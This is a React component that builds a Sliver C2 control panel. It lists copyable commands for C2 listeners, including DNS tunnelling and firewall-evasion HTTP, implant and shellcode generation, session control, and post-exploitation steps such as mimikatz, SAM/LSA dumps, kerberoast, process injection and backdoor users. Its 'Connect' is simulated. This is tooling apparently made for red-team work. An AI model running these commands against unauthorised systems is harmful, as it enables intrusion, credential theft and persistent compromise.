import { useState } from "react";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Switch } from "@/components/ui/switch";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Badge } from "@/components/ui/badge";
import { toast } from "@/hooks/use-toast";
import { Copy, Check, Server, Key, Globe, Radio, Zap, Terminal, Shield } from "lucide-react";

interface SliverConfig {
  serverHost: string;
  serverPort: string;
  operatorName: string;
  configPath: string;
  mtlsPort: string;
  httpPort: string;
  httpsPort: string;
  dnsPort: string;
}

interface SliverDialogProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
}

const defaultConfig: SliverConfig = {
  serverHost: "",
  serverPort: "31337",
  operatorName: "operator",
  configPath: "~/.sliver/configs/",
  mtlsPort: "8888",
  httpPort: "80",
  httpsPort: "443",
  dnsPort: "53",
};

export function SliverDialog({ open, onOpenChange }: SliverDialogProps) {
  const [config, setConfig] = useState<SliverConfig>(() => {
    const saved = localStorage.getItem("sliver-config");
    return saved ? JSON.parse(saved) : defaultConfig;
  });
  const [isConnected, setIsConnected] = useState(false);
  const [isConnecting, setIsConnecting] = useState(false);
  const [copiedField, setCopiedField] = useState<string | null>(null);

  const handleSaveConfig = () => {
    localStorage.setItem("sliver-config", JSON.stringify(config));
    toast({ title: "Configuration Saved", description: "Sliver settings saved locally" });
  };

  const handleConnect = async () => {
    if (!config.serverHost) {
      toast({ title: "Missing Fields", description: "Please fill in server host", variant: "destructive" });
      return;
    }
    setIsConnecting(true);
    setTimeout(() => {
      setIsConnecting(false);
      setIsConnected(true);
      handleSaveConfig();
      toast({ title: "Connected", description: `Connected to Sliver server at ${config.serverHost}` });
    }, 2000);
  };

  const copyToClipboard = (text: string, field: string) => {
    navigator.clipboard.writeText(text);
    setCopiedField(field);
    setTimeout(() => setCopiedField(null), 2000);
  };

  const listeners = [
    {
      name: "mTLS Listener",
      command: `mtls -L ${config.serverHost || "<SERVER>"} -l ${config.mtlsPort}`,
      description: "Mutual TLS encrypted C2 channel",
    },
    {
      name: "HTTP Listener",
      command: `http -L ${config.serverHost || "<SERVER>"} -l ${config.httpPort}`,
      description: "HTTP-based C2 for firewall evasion",
    },
    {
      name: "HTTPS Listener",
      command: `https -L ${config.serverHost || "<SERVER>"} -l ${config.httpsPort}`,
      description: "HTTPS-based C2 with SSL",
    },
    {
      name: "DNS Listener",
      command: `dns -d ${config.serverHost || "<DOMAIN>"} -l ${config.dnsPort}`,
      description: "DNS tunneling for restrictive networks",
    },
    {
      name: "WireGuard Listener",
      command: `wg -L ${config.serverHost || "<SERVER>"} -l 51820`,
      description: "WireGuard VPN-based C2",
    },
  ];

  const implants = [
    {
      name: "Windows Beacon (mTLS)",
      command: `generate beacon --mtls ${config.serverHost || "<SERVER>"}:${config.mtlsPort} --os windows --arch amd64 --format exe --save /tmp/beacon.exe`,
    },
    {
      name: "Windows Session (mTLS)",
      command: `generate --mtls ${config.serverHost || "<SERVER>"}:${config.mtlsPort} --os windows --arch amd64 --format exe --save /tmp/session.exe`,
    },
    {
      name: "Linux Beacon",
      command: `generate beacon --mtls ${config.serverHost || "<SERVER>"}:${config.mtlsPort} --os linux --arch amd64 --format elf --save /tmp/beacon`,
    },
    {
      name: "macOS Beacon",
      command: `generate beacon --mtls ${config.serverHost || "<SERVER>"}:${config.mtlsPort} --os darwin --arch amd64 --format macho --save /tmp/beacon`,
    },
    {
      name: "Shellcode",
      command: `generate --mtls ${config.serverHost || "<SERVER>"}:${config.mtlsPort} --os windows --arch amd64 --format shellcode --save /tmp/shellcode.bin`,
    },
    {
      name: "Shared Library (DLL)",
      command: `generate --mtls ${config.serverHost || "<SERVER>"}:${config.mtlsPort} --os windows --arch amd64 --format shared --save /tmp/implant.dll`,
    },
    {
      name: "Service Binary",
      command: `generate --mtls ${config.serverHost || "<SERVER>"}:${config.mtlsPort} --os windows --arch amd64 --format service --save /tmp/service.exe`,
    },
  ];

  const sessionCommands = [
    { name: "List Sessions", command: "sessions" },
    { name: "Use Session", command: "use <session_id>" },
    { name: "List Beacons", command: "beacons" },
    { name: "Interactive Beacon", command: "interactive" },
    { name: "System Info", command: "info" },
    { name: "Get UID", command: "whoami" },
    { name: "Process List", command: "ps" },
    { name: "Get Privs", command: "getprivs" },
    { name: "Impersonate", command: "impersonate <username>" },
    { name: "Make Token", command: "make-token -u <user> -p <pass> -d <domain>" },
    { name: "Execute", command: "execute -o <command>" },
    { name: "Shell", command: "shell" },
    { name: "Upload", command: "upload /local/path /remote/path" },
    { name: "Download", command: "download /remote/path /local/path" },
    { name: "Screenshot", command: "screenshot" },
    { name: "Port Forward", command: "portfwd add -l <lport> -r <rhost>:<rport>" },
    { name: "SOCKS Proxy", command: "socks5 start -P <port>" },
    { name: "Pivot", command: "pivots tcp --bind <ip>:<port>" },
  ];

  const postExploit = [
    { name: "Mimikatz (Credentials)", command: "mimikatz" },
    { name: "SAM Dump", command: "sam" },
    { name: "LSA Dump", command: "lsa" },
    { name: "Kerberoast", command: "kerberoast" },
    { name: "Process Inject", command: "migrate <pid>" },
    { name: "DLL Inject", command: "execute-assembly /path/to/assembly.exe" },
    { name: "Backdoor User", command: "backdoor -u <username> -p <password>" },
    { name: "Registry Read", command: "registry read HKLM\\\\SOFTWARE\\\\..." },
    { name: "Environment", command: "env" },
  ];

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="max-w-4xl h-[85vh] bg-slate-900 border-green-500/30 p-0 flex flex-col">
        <DialogHeader className="px-6 pt-6 pb-4 border-b border-slate-700/50 flex-shrink-0">
          <div className="flex items-center gap-3">
            <div className="p-2 bg-green-500/20 rounded-lg">
              <span className="text-2xl">🐍</span>
            </div>
            <div>
              <DialogTitle className="text-xl font-bold text-white flex items-center gap-2">
                Sliver C2 Framework
                {isConnected && <Badge className="bg-emerald-500/20 text-emerald-400 border-emerald-500/30">Connected</Badge>}
              </DialogTitle>
              <DialogDescription className="text-slate-400">Configure Sliver server and manage implants</DialogDescription>
            </div>
          </div>
        </DialogHeader>

        <Tabs defaultValue="connection" className="flex-1 flex flex-col min-h-0">
          <TabsList className="mx-6 mt-4 bg-slate-800/50 border border-slate-700/50 flex-shrink-0">
            <TabsTrigger value="connection" className="data-[state=active]:bg-green-500/20 data-[state=active]:text-green-400">
              <Server className="w-4 h-4 mr-2" />Connection
            </TabsTrigger>
            <TabsTrigger value="listeners" className="data-[state=active]:bg-green-500/20 data-[state=active]:text-green-400">
              <Radio className="w-4 h-4 mr-2" />Listeners
            </TabsTrigger>
            <TabsTrigger value="implants" className="data-[state=active]:bg-green-500/20 data-[state=active]:text-green-400">
              <Zap className="w-4 h-4 mr-2" />Implants
            </TabsTrigger>
            <TabsTrigger value="session" className="data-[state=active]:bg-green-500/20 data-[state=active]:text-green-400">
              <Terminal className="w-4 h-4 mr-2" />Session
            </TabsTrigger>
            <TabsTrigger value="post" className="data-[state=active]:bg-green-500/20 data-[state=active]:text-green-400">
              <Shield className="w-4 h-4 mr-2" />Post-Exploit
            </TabsTrigger>
          </TabsList>

          <div className="flex-1 min-h-0 px-6 pb-6">
            <ScrollArea className="h-full mt-4">
              <TabsContent value="connection" className="mt-0 space-y-6">
                <div className="p-4 bg-slate-800/50 rounded-lg border border-slate-700/50 space-y-4">
                  <h3 className="text-sm font-semibold text-green-400 uppercase tracking-wider flex items-center gap-2">
                    <Server className="w-4 h-4" />Server Configuration
                  </h3>
                  <div className="grid grid-cols-2 gap-4">
                    <div className="space-y-2">
                      <Label className="text-slate-300 flex items-center gap-2"><Globe className="w-3.5 h-3.5" />Server Host</Label>
                      <Input value={config.serverHost} onChange={(e) => setConfig({ ...config, serverHost: e.target.value })} placeholder="192.168.1.100" className="bg-slate-900 border-slate-600 text-white" />
                    </div>
                    <div className="space-y-2">
                      <Label className="text-slate-300">Server Port</Label>
                      <Input value={config.serverPort} onChange={(e) => setConfig({ ...config, serverPort: e.target.value })} placeholder="31337" className="bg-slate-900 border-slate-600 text-white" />
                    </div>
                  </div>
                  <div className="grid grid-cols-2 gap-4">
                    <div className="space-y-2">
                      <Label className="text-slate-300">Operator Name</Label>
                      <Input value={config.operatorName} onChange={(e) => setConfig({ ...config, operatorName: e.target.value })} placeholder="operator" className="bg-slate-900 border-slate-600 text-white" />
                    </div>
                    <div className="space-y-2">
                      <Label className="text-slate-300">Config Path</Label>
                      <Input value={config.configPath} onChange={(e) => setConfig({ ...config, configPath: e.target.value })} placeholder="~/.sliver/configs/" className="bg-slate-900 border-slate-600 text-white" />
                    </div>
                  </div>
                </div>

                <div className="p-4 bg-slate-800/50 rounded-lg border border-slate-700/50 space-y-4">
                  <h3 className="text-sm font-semibold text-green-400 uppercase tracking-wider">Listener Ports</h3>
                  <div className="grid grid-cols-4 gap-4">
                    <div className="space-y-2">
                      <Label className="text-slate-300">mTLS</Label>
                      <Input value={config.mtlsPort} onChange={(e) => setConfig({ ...config, mtlsPort: e.target.value })} placeholder="8888" className="bg-slate-900 border-slate-600 text-white" />
                    </div>
                    <div className="space-y-2">
                      <Label className="text-slate-300">HTTP</Label>
                      <Input value={config.httpPort} onChange={(e) => setConfig({ ...config, httpPort: e.target.value })} placeholder="80" className="bg-slate-900 border-slate-600 text-white" />
                    </div>
                    <div className="space-y-2">
                      <Label className="text-slate-300">HTTPS</Label>
                      <Input value={config.httpsPort} onChange={(e) => setConfig({ ...config, httpsPort: e.target.value })} placeholder="443" className="bg-slate-900 border-slate-600 text-white" />
                    </div>
                    <div className="space-y-2">
                      <Label className="text-slate-300">DNS</Label>
                      <Input value={config.dnsPort} onChange={(e) => setConfig({ ...config, dnsPort: e.target.value })} placeholder="53" className="bg-slate-900 border-slate-600 text-white" />
                    </div>
                  </div>
                </div>

                <div className="p-4 bg-slate-800/50 rounded-lg border border-slate-700/50">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-3">
                      <div className={`w-3 h-3 rounded-full ${isConnected ? 'bg-emerald-500 shadow-lg shadow-emerald-500/50' : 'bg-red-500/70'}`} />
                      <span className="text-slate-300">{isConnected ? `Connected to ${config.serverHost}` : "Not connected"}</span>
                    </div>
                    <div className="flex gap-2">
                      <Button variant="outline" size="sm" onClick={handleSaveConfig} className="border-slate-600 hover:bg-slate-700">Save</Button>
                      <Button size="sm" onClick={handleConnect} disabled={isConnecting} className="bg-green-600 hover:bg-green-500">
                        {isConnecting ? "Connecting..." : "Connect"}
                      </Button>
                    </div>
                  </div>
                </div>

                <div className="p-4 bg-slate-800/50 rounded-lg border border-slate-700/50">
                  <h3 className="text-sm font-semibold text-amber-400 uppercase tracking-wider mb-3">Quick Start</h3>
                  <div className="space-y-2 text-sm text-slate-400">
                    <p>1. Start Sliver server: <code className="bg-slate-900 px-2 py-1 rounded text-green-400">sliver-server</code></p>
                    <p>2. Create operator config: <code className="bg-slate-900 px-2 py-1 rounded text-green-400">new-operator --name {config.operatorName} --lhost {config.serverHost || "<IP>"}</code></p>
                    <p>3. Import config on client: <code className="bg-slate-900 px-2 py-1 rounded text-green-400">sliver import ./operator.cfg</code></p>
                  </div>
                </div>
              </TabsContent>

              <TabsContent value="listeners" className="mt-0 space-y-4">
                <p className="text-sm text-slate-400 mb-4">Start listeners to catch implant callbacks.</p>
                {listeners.map((item, index) => (
                  <div key={index} className="p-4 bg-slate-800/50 rounded-lg border border-slate-700/50">
                    <div className="flex items-center justify-between mb-2">
                      <div>
                        <h4 className="text-sm font-semibold text-green-400">{item.name}</h4>
                        <span className="text-[10px] text-slate-500">{item.description}</span>
                      </div>
                      <Button variant="ghost" size="sm" onClick={() => copyToClipboard(item.command, `listener-${index}`)} className="h-7 px-2">
                        {copiedField === `listener-${index}` ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4 text-slate-400" />}
                      </Button>
                    </div>
                    <pre className="text-xs text-slate-300 bg-slate-900 p-3 rounded overflow-x-auto">{item.command}</pre>
                  </div>
                ))}
              </TabsContent>

              <TabsContent value="implants" className="mt-0 space-y-4">
                <p className="text-sm text-slate-400 mb-4">Generate implants for different platforms.</p>
                {implants.map((item, index) => (
                  <div key={index} className="p-4 bg-slate-800/50 rounded-lg border border-slate-700/50">
                    <div className="flex items-center justify-between mb-2">
                      <h4 className="text-sm font-semibold text-amber-400">{item.name}</h4>
                      <Button variant="ghost" size="sm" onClick={() => copyToClipboard(item.command, `implant-${index}`)} className="h-7 px-2">
                        {copiedField === `implant-${index}` ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4 text-slate-400" />}
                      </Button>
                    </div>
                    <pre className="text-xs text-slate-300 bg-slate-900 p-3 rounded overflow-x-auto">{item.command}</pre>
                  </div>
                ))}
              </TabsContent>

              <TabsContent value="session" className="mt-0">
                <p className="text-sm text-slate-400 mb-4">Session management commands.</p>
                <div className="grid grid-cols-2 gap-3">
                  {sessionCommands.map((item, index) => (
                    <div key={index} className="p-3 bg-slate-800/50 rounded-lg border border-slate-700/50 hover:border-green-500/40 cursor-pointer transition-colors" onClick={() => copyToClipboard(item.command, `session-${index}`)}>
                      <div className="flex items-center justify-between mb-1">
                        <span className="text-xs font-medium text-slate-300">{item.name}</span>
                        {copiedField === `session-${index}` ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5 text-slate-500" />}
                      </div>
                      <code className="text-[11px] text-green-400 font-mono">{item.command}</code>
                    </div>
                  ))}
                </div>
              </TabsContent>

              <TabsContent value="post" className="mt-0">
                <p className="text-sm text-slate-400 mb-4">Post-exploitation commands.</p>
                <div className="grid grid-cols-2 gap-3">
                  {postExploit.map((item, index) => (
                    <div key={index} className="p-3 bg-slate-800/50 rounded-lg border border-slate-700/50 hover:border-green-500/40 cursor-pointer transition-colors" onClick={() => copyToClipboard(item.command, `post-${index}`)}>
                      <div className="flex items-center justify-between mb-1">
                        <span className="text-xs font-medium text-slate-300">{item.name}</span>
                        {copiedField === `post-${index}` ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5 text-slate-500" />}
                      </div>
                      <code className="text-[11px] text-purple-400 font-mono">{item.command}</code>
                    </div>
                  ))}
                </div>
              </TabsContent>
            </ScrollArea>
          </div>
        </Tabs>
      </DialogContent>
    </Dialog>
  );
}
